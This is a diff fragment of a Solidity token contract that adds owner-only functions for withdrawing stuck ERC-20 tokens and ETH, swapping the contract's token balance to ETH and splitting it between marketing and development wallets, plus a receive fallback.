+    function withdrawStuckTokens(address _token, address _to) external onlyOwner returns (bool _sent) {
+        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
+        _sent = IERC20(_token).transfer(_to, _contractBalance);
+        emit TransferForeignToken(_token, _contractBalance);
+    }
+
+    function clearStuckEthers(uint256 amountPercentage) external onlyOwner {
+        uint256 amountETH = address(this).balance;
+        payable(msg.sender).transfer((amountETH * amountPercentage) / 100);
+        emit StuckEthersCleared();
+    }
+
+    function unclog() public onlyOwner lockSwapping {
+        swapTokensForETH(
+            balanceOf(address(this))
+        );
+
+        uint256 ethBalance = address(this).balance;
+        uint256 ethMarketing = ethBalance / 2;
+        uint256 ethDevelopment = ethBalance - ethMarketing;
+
+        bool success;
+        (success, ) = address(marketingWallet).call{value: ethMarketing}("");
+
+        (success, ) = address(developmentWallet).call{value: ethDevelopment}(
+            ""
+        );
+    }
+
+    // fallbacks
+    receive() external payable {}
 }
